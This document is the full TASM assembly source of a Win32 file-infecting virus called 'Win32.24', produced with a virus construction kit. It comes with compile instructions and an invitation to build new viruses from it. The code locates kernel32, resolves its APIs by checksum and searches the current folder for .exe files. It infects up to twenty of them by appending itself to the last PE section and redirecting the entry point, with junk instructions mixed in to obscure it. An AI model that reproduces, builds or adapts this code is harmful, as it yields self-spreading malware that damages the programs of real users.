              
;
;
; Win32.24 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.24
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 24
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 45
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov ebx, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
                                        ; mov ebp, ebx
 mov ebp, ebx
 sub ebp, offset Delta
 jmp KernelSearchStart


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, 0
 mov ebx, dword ptr [ebp+AlignReg2]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 sub ecx, ebx                           ; Trash
 popad
ret


;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, esi

 push esi
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edx, offset WIN32_FIND_DATA
 add edx, ebp

 push edx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 xor dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, ( 276d + 31d )
 sub edx, 31d
 lea eax, [ebp+WFD_szFileName]
 xchg esi, eax


ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 add esi, 1d
 dec edx
 jnz ClearOldData2
 popad
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

 push dword ptr [ebp+OldBase]
 pop edx

 mov dword ptr [ebp+retBase], edx



                                        ; number of API's we're looking for
 push NumberOfApis
 pop edx
 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 sub ecx, ecx
 add ecx, [ebx+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
                                        ; add ecx, 4
 add ecx, 4d
 mov dword ptr [ebp+ATableVA], ebx
                                        ; get NTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
                                        ; get OTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 add dword ptr [ebp+Trash1], ebx        ; Trash
 mov dword ptr [ebp+OTableVA], ebx
                                        ; load API Names and Offsets
 lea ecx, [ebp+APINames]
 xchg ecx, eax

 lea ecx, [ebp+APIOffsets]
 xchg esi, ecx


GetApisLoop: 

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add eax, 4
 add eax, 4d
 push dword ptr [ebp+TempAPI]
 pop ebx
 mov dword ptr [esi], 0
 add dword ptr [esi], ebx
                                        ; add esi, 4
 add esi, 4d
 dec edx
 jnz GetApisLoop
 mov edi, offset Outbreak
 add edi, ebp

 push edi
ret



;          [ ///// * Execute Original File * \\\\\ ]

 adc dword ptr [ebp+Trash1], ebx        ; Trash
NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear edx
 push 0
 pop edx
 xor edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edx

 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 inc ebp
 dec ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear edx
 and edx, 0
 mov dx, word ptr [ecx+3Ch]
 cmp edx, 0
 je Notagoodfile
                                        ; clear edx
 mov edx, 15944d
 sub edx, 15944d
 add edx, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; mov ebx, 4671
 mov ebx, ( 4671d xor 29d )
 xor ebx, 29d
 cmp ebx, 4671d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '24'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov ax, word ptr [edx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov bx, word ptr [edx+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ebx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push ebx
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ebx]
                                        ; mov ebx, edx
                                        ; clear ebx
 and ebx, 0
 add ebx, edx
                                        ; mov edi, ebx
                                        ; clear edi
 mov edi, -4932d
 add edi, 4932d
 add edi, ebx
 push edi
 pop dword ptr [ebp+TempApisearch2]
 push eax
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [eax]
 LoopChsksm:
                                        ; clear edx
 sub edx, edx
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 shl dx,8d
 sub ecx, edx
 test dx, dx
 jz LoopConti
                                        ; clear edx
 mov edx, 0
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 xor dword ptr [ebp+Trash1], 479799     ; Trash
 sub ecx, edx
 cmp dx, 0
 jne LoopChsksm
LoopConti:
 sub ecx, 1
 add ecx, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ebx
 mov eax, dword ptr [ebp+TempApisearch3]
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 add ebx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
 sal ecx, 20d                           ; Trash
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov ebx, edx
 movzx edx, word ptr [ebx]
 shl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ebx, dword ptr [esp]
                                        ; round to pages
 xor bx, bx
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 3h

GK1:                                    ; check for DOS-EXE Stub
 mov eax, dword ptr [ebp+K32Trys]
 or eax, eax
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je CheckPE

GK2:
 add ebx, -65536d
 mov edx, dword ptr [ebp+K32Trys]
 dec edx
 mov dword ptr [ebp+K32Trys], edx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ebx, 60
 add ebx, 60d
 mov edx, [ebx]
 sub ebx, 60d
 add edx, ebx
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 dec edx
 add edx, 23d
                                        ; clear ecx
 mov ecx, -10482d
 add ecx, 10482d
 mov cx, word ptr [edx]
 and cx, 0F000h
 cmp cx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
                                        ; mov eax, 22
 push 22d
 pop eax
 sub edx, eax


KernelFound:
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], ebx
 mov dword ptr [ebp+KernelPE], edx

 jmp GetApis

;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edi, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 inc dword ptr [ebp+Trash1]             ; Trash
 cmp eax, 0
 je EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+InfCounter]
 test edx, edx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;                  [ ///// * Data * \\\\\ ]

Data:

 APINames:
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h

 Trash1      dd 0h
 KernelPE    dd 0h
 AlignReg1   dd 0h
 OldEIP      dd 0h
 K32Trys     dd 0h
 TempApisearch3 dd 0h
 OldBase     dd 400000h
 NTableVA    dd 0h
 NewEIP      dd 0h
 filemask    db '*.eXe',0

 APIOffsets:
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h

 counter     dw 0h
 ATableVA    dd 0h
 TempApisearch2 dd 0h
 MapAddress  dd 0h
 NewSize     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 MapHandle   dd 0h
 InfCounter  dd 0h
 TempAPI     dd 0h
 KernelMZ    dd 0h
 OTableVA    dd 0h
 AlignReg2   dd 0h
 FindHandle  dd 0h
 db 'Win32.24 of SnakeByte',0
 FileHandle  dd 0h




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [ecx+3Ch]
 add esi, ecx
                                        ; get File Alignment
 mov edx, [esi+3Ch]
                                        ; clear ebx
 push 0
 pop ebx
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], 0
 add eax, 14825047d                     ; Trash
 add dword ptr [ebp+AlignReg1], ebx
 call Align
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ebx
 pushad
 mov eax, eax                           ; Trash
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push ebx
 pop esi
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 add edx, -1
 imul edx, edx, 28h
                                        ; add ebx, 120
 dec ebx
 add ebx, 121d
 add ebx, edx
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [esi+74h]
 sal ecx, 3
 add ebx, ecx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor ecx, 74582782d                     ; Trash
 xor dword ptr [ebp+OldBase], edx
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov edx, [ebx+10h]
                                        ; mov ecx, edx
                                        ; clear ecx
 mov ecx, -64542d
 add ecx, 64542d
 add ecx, edx
 add ebx, 14h
 add edx, [ebx]
 sub ebx, 14h
 push edx
 push ecx
 pop eax
 add eax, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
                                        ; clear eax
 push 0
 pop eax

 add eax, [ebx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 sub dword ptr [ebp+Trash1], ebx        ; Trash
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [ebx+08h], eax
 mov eax, dword ptr [ebx+10h]
 add eax, dword ptr [ebx+0Ch]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '24'
                                        ; Append Virus
 pop edi
 mov ebx, VirusSize
 lea edx, [ebp+Virus]
 xchg esi, edx

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+InfCounter]
 dec ebx
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

 and eax, eax                           ; Trash
                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 inc eax                                ; Trash
 mov esi, offset WFD_szFileName
 add esi, ebp

 push esi
 call dword ptr [ebp+XCreateFileA]
 inc ebx                                ; Trash

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
                                        ; mov ebx, 4
 push 4d
 pop ebx
 mov edx, 43389863d                     ; Trash
 push ebx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 ror ebx, 3d                            ; Trash
 pop ecx
 or eax, eax
 jz CloseFile
                                        ; clear edx
 xor edx, edx
 push ecx
 push edx
 push edx
 rcl eax, 8d                            ; Trash
                                        ; mov ebx, 2
 mov ebx, ( 2d xor 2d )
 xor ebx, 2d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 dec eax
 add eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 xor ecx, ecx
 push ecx
 call ExitProcess



end FakeCode

